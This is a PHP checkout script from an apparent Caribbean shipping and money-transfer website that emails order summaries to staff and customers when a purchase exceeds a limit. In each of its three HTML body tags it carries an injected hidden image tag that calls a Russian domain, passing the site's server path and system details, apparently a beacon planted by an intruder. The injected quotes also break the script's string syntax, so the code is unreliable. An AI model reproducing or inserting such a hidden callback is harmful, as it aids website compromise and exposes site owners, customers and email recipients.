<?php
/* Programme : checkout_depasse_msg.php
* Description : Gestion des achats qui d�passe la limite permise
* Auteur : Denis L�veill� 	 		  Date : 2007-10-28
*/
include('lib/config.php');

$Large = 680;

if( !isset($_SESSION['Service']) || !$_SESSION[$_SERVER['SERVER_NAME']] ) {
	echo "<META HTTP-EQUIV=Refresh CONTENT='0; URL=accueil.php'>";
	exit();
} 

$infosClient = infos_client($_SESSION[$_SERVER['SERVER_NAME']]);

$TabModPay	= 	get_Modepaye(); 
$TxCUC_USD = get_TauxVente("CUC");  
$Symbole	=	get_Symbole($_SESSION['devise']);
$FctDate		= $_SESSION['Totaux']['DateFacture'];

// ***** Le message � Antillas ( les ventes ) est en espagnol - A programmer dans parametre
$_Langue = $_SESSION['langue'];
$Devise = $_SESSION['devise'];
$_SESSION['langue'] = 'sp';  //  A programmer dans parametre
$txt = textes($_SESSION['langue']);

// **** Choix de la langue de travail ****
switch( $_SESSION['langue'] ) {
	case "en" : 	include("trsmessen.inc");
						break;
	case "fr" : 	include("trsmessfr.inc");
						break;
	default : 		include("trsmesssp.inc");  
} // switch SLangue


// Gestion des ACHATS
if( $_SESSION['Service'] == $_SERVICE_ACHAT  )  {
	$TXUSD_CAD = get_TauxVente("CAD"); 
	$TXUSD_EUR = get_TauxVente("EUR");
	$monPanier = panierInfos($_SESSION['panier']);
	if( $monPanier && (!isset($_SESSION['OrderId']) || ($_SESSION['OrderId'] == 0) ) )
		$_SESSION['OrderId'] = Insert_vente( $_SESSION[$_SERVER['SERVER_NAME']], $_SESSION['destinataire'], $_SESSION['panier'], $_SESSION['Totaux'], $_SESSION['paiement'] );

	$_SESSION['devise'] = $CurTrans = 'CUC';
	$STotal = $_SESSION['Totaux']['SousTotalCUC'];
	$Livraison = $_SESSION['Totaux']['LivraisonCUC'];
	$Total =  $_SESSION['Totaux']['TotalCUC'];
}
else {
	$TXUSD_CAD = get_TauxAchat("CAD"); 
	$TXUSD_EUR = get_TauxAchat("EUR");
	// Une commande de service TRANSFERT-COLIS
	$TabService	= 	get_service("");	   
	$TabUnite	= 	get_unite();
	$TabTrs		= 	get_money( "Transfert" );
	$FrTransant =	$_SESSION['transaction']['FrTransant'];
	$FrFixe		=	$_SESSION['transaction']['FrFixe'];
	$CoutUS		=	$_SESSION['transaction']['CoutUS'];
	$CurTrans	=	$_SESSION['transaction']['CurTrans'];
	$Pourcent	=	$_SESSION['transaction']['Pourcent'];
	$Plus			=	$_SESSION['transaction']['Plus'];
	$ModePaye	=	$_SESSION['paiement']['ModePaye'];
	$Total		=	$_SESSION['Totaux']['totalpourbanque']; 
	$Service		=	$_SESSION['transaction']['Service'];

	$DevDisp = $_SESSION['devise'];
	$TauxChg = get_TauxVente($DevDisp);
	if( ($TabUnite[$Service] == "POID/WEIGHT") || ($TabUnite[$Service] == "UNIT�/UNIT") ) { 
		$Transfert	=	$TransUS		=	"";
		$Titre = $txt['sommaire_dela_livraison'];
		$recalc = "paquet_calcul.php";
		$Poids 		= 	$_SESSION['transaction']['Poids'];
		$Assurance	=	$_SESSION['transaction']['Assurance']; 
		$Douane		=	$_SESSION['transaction']['Douane'];
	}
  	elseif( $TabUnite[$Service] == "ARGENT/CASH" ) {
		$Transfert	=	$_SESSION['transaction']['Transfert'];
		$TransUS		=	$_SESSION['transaction']['TransUS'];
		$Poids 		= 	$Assurance	=	$Douane		=	"";
		$Titre = $txt['sommaire_du_transfert'];
		$recalc = "transfert_calcul.php";
	}
	else {
		$Transfert	=	$_SESSION['transaction']['Transfert'];
		$TransUS		=	$_SESSION['transaction']['TransUS'];
		$Poids 		= 	$Assurance	=	$Douane		=	"";
		$Titre = $txt['sommaire_du_transfert'];
		$recalc = "certificat_calcul.php";
	}
//	$EN_PANIER = 1;
}

	// Image de la devise actuel pay�
	switch( $_SESSION['devise'] ) {
		case 'CUC':	$image = $entr_url.'/images/cuba.gif';
						break;
		case 'USD': $image = $entr_url.'/images/usa.gif';
						break;
		case 'EUR': $image = $entr_url.'/images/europe.gif';
						break;
		default	 : $image = $entr_url.'/images/canada.gif';
						break;
	}
	// Image de la devise USD
	$imageUSD = $entr_url.'/images/usa.gif';

	// Image de la devise de la transaction
	switch( $CurTrans ) {
		case 'CUC':	$imageTRS = $entr_url.'/images/cuba.gif';
						break;
		case 'USD': $imageTRS = $entr_url.'/images/usa.gif';
						break;
		case 'EUR': $imageTRS = $entr_url.'/images/europe.gif';
						break;
		default	 : $imageTRS = $entr_url.'/images/canada.gif';
						break;
	}


$_AVECENTETE = 1;
$_AVECCLIENT = 1;
$_AVECITEM = 1;
$_AVECTOTAL = 1;

//*************************************************************************************************
//**************************** PARTIE D'ANTILLAS **************************************************
//*************************************************************************************************

$message = "
			<b><big>***** ORDEN EXCEDE NUESTRO LIMITE *****</big></b><br><br>
			Hola,<br>
			<br>
			Una orden fue aceptada con antillas-express.com y debe ser procesada.<br>
			Aqui estan las informaciones :<br><br>";
ob_start();
echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
	</head>";
include('styles/style.inc');
echo 
"<body width='$Large' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<table bgcolor='#FFFFFF' width='$Large' cellpadding='0' cellspacing='0' border='1' align='$Enligne' >
	<tr>
		<td colspan='2'>
			<table width='<?=$Large?>' align='<?=$Enligne?>' cellpadding='0' cellspacing='0' border='0' bordercolor='#9EA2AB' style='margin-top:2px;' >";
	if( $_SESSION['Service'] == $_SERVICE_ACHAT )
		include('facture.inc');
	else
		include('commande.inc');
echo	"
			</table>
		</td>
	</tr>
</table>
<br>
</body>
</html>";

$message .= ob_get_contents();

ob_end_clean();

if( $_SESSION['Service'] == $_SERVICE_ACHAT )
	$to = $param['Email_facture'];
else
	$to = $param['Email_commande'];

$sujet = sprintf( $txt['facture_depasse_sujet'], $param['nom_client'], @$_SESSION['OrderId'] );
$headers  = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: Antillas Express <".$param['email_envoi'].">\r\n";
// $headers .= "Disposition-Notification-To: webmaster@antillas-express.com\r\n";

mail($to, $sujet, $message, $headers);
//echo "<br><br>To : ".$to."<br>Head : ".$headers."<br>Sujet : ".$sujet."<br>Mess : ".$message."<br>";

// Stoppe pour 5 secondes
sleep(5);
//*************************************************************************************************
//**************************** PARTIE DU CLIENT ***************************************************
//*************************************************************************************************
$_SESSION['paiement']['ModePaye']		= 0;
unset( $_SESSION['paiement']['trnCardNumber'] );
unset( $_SESSION['paiement']['trnExpMonth'] );
unset( $_SESSION['paiement']['trnExpYear'] );
unset( $_SESSION['paiement']['detenteur'] );

$_SESSION['langue'] = $_Langue;

$_SESSION['devise'] = $Devise;

$txt = textes($_SESSION['langue']);

$Symbole	=	get_Symbole($_SESSION['devise']);

// **** Choix de la langue de travail ****
switch( $_SESSION['langue'] ) {
	case "en" : 	include("trsmessen.inc");
						break;
	case "fr" : 	include("trsmessfr.inc");
						break;
	default : 		include("trsmesssp.inc");  
} // switch SLangue


// Gestion des ACHATS
if( $_SESSION['Service'] == $_SERVICE_ACHAT  )  {
	if( $_SESSION['devise'] == 'CUC' ){
		$image = $entr_url.'/images/cuba.gif';
		$STotal = $_SESSION['Totaux']['SousTotalCUC'];
		$Livraison = $_SESSION['Totaux']['LivraisonCUC'];
		$Total =  $_SESSION['Totaux']['TotalCUC'];
	
	}
	elseif( $_SESSION['devise'] == 'USD' ){
		$image = $entr_url.'/images/usa.gif';
		$STotal = $_SESSION['Totaux']['SousTotalUSD'];
		$Livraison = $_SESSION['Totaux']['LivraisonUSD'];
		$Total =  $_SESSION['Totaux']['TotalUSD'];
	}
	elseif( $_SESSION['devise'] == 'EUR' ){
		$image = $entr_url.'/images/europe.gif';
		$STotal = $_SESSION['Totaux']['SousTotalEUR'];
		$Livraison = $_SESSION['Totaux']['LivraisonEUR'];
		$Total =  $_SESSION['Totaux']['TotalEUR'];
	}
	else{
		$image = $entr_url.'/images/canada.gif';
		$STotal = $_SESSION['Totaux']['SousTotalCAD'];
		$Livraison = $_SESSION['Totaux']['LivraisonCAD'];
		$Total =  $_SESSION['Totaux']['TotalCAD'];
	}
}

ob_start();
echo "
<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
	</head>";
include('styles/style.inc');
echo 
"<body width='$Large' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<table bgcolor='#FFFFFF' width='$Large' cellpadding='0' cellspacing='0' border='1' align='$Enligne' >
	<tr>
		<td colspan='2'>
			<table width='<?=$Large?>' align='<?=$Enligne?>' cellpadding='0' cellspacing='0' border='0' bordercolor='#9EA2AB' style='margin-top:2px;' >";
	if( $_SESSION['Service'] == $_SERVICE_ACHAT )
		include('facture.inc');
	else
		include('commande.inc');
echo	"
			</table>
		</td>
	</tr>
</table>
<br>
</body>
</html>";

$message = ob_get_contents();

ob_end_clean();

$to=$infosClient['Courriel'];
$sujet = sprintf( $txt['facture_depasse_sujet'], $param['nom_client'], @$_SESSION['OrderId'] );

mail($to, $sujet, $message, $headers);
//echo "<br><br>".$message."<br>";

//*************************************************************************************************
//**************************** MESSAGE AU CLIENT ***************************************************
//*************************************************************************************************
$Merci = sprintf( $txt['message_merci'], $param['nom_client'] );


echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
<body width='$Large' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<table bgcolor='#FFFFFF' width='$Large' cellpadding='4' cellspacing='4' border='1' align='$Enligne' >
	<tr>
		<td colspan='2'>
			<div align=center>";
	echo sprintf( $txt['msg_depasse'], $_SESSION['OrderId'], $_SESSION['Totaux']['totalpourbanque'] );
	echo "<br><br>";
	echo $Merci;
	echo "
		<br><br></div><div align='center'><font size=+1>".
		$txt['form_telephone']." : ".$param['telephone_client']."<br>".
		$txt['form_telecopieur']." : ".$param['fax_client']."<br>".
		$txt['form_courriel']." : <a href='mailto:".hexentities($param['email_info'])."'>".hexentities($param['email_info'])."</a><br><br>".
		$txt['Horaire']."<br>
		<br><br>		
		</font>
		</div>
		</td>
	</tr>
</table>";
				$script = "<script language='javascript'>\r";
				$script .= "	if( top.window.frames[0] && top.window.frames[0].Rafraichie )\r"; 
				$script .= "		top.window.frames[0].Rafraichie();\r";
				$script .= "</script>\r";
				echo $script;
echo "
</body>
</html>";

	$_SESSION['paiement'] = array();
	$_SESSION['panier'] = array();

	unset($_SESSION['Frais']);
	unset($_SESSION['Totaux']);
	unset($_SESSION['transaction']);
	unset($_SESSION['paiement']);
	unset($_SESSION['panier']);
	unset($_SESSION['destinataire']);
	unset($_SESSION['Service']);
	unset($_SESSION['OrderId']);


?>